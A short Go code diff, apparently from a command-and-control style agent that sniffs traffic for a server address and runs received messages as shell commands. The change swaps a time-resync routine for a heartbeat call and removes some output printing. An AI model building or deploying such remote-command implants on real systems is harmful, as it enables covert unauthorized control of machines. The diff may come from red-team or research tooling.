@@ -57,7 +57,7 @@ func StartSniffer(newAgent agent.Agent) {
 					newAgent.ServerIP = []byte(ret)
 					agent.Setup(newAgent)
 				} else {
-					Resync(newAgent)
+					Heartbeat(newAgent)
 				}
 
 				fmt.Println("ping. serverip: ", newAgent.ServerIP)
@@ -95,24 +95,6 @@ func runCommand(msg string, newAgent agent.Agent) {
 	fmt.Print("Command: ")
 	fmt.Println(msg)
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
-
-	if err != nil {
-		fmt.Println(err.Error())
-		fmt.Println("Couldn't execute command")
-	}
-
-	fmt.Println(string(output))
-}
-
-func Resync(newAgent agent.Agent) {
-	var command string
-	if newAgent.OpSys == "Windows" {
-		command = "w32tm /resync"
-	} else {
-		command = "echo resync time" //TODO actual linux command
-	}
-
-	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, command).Output()
 
 	if err != nil {
 		fmt.Println(err.Error())
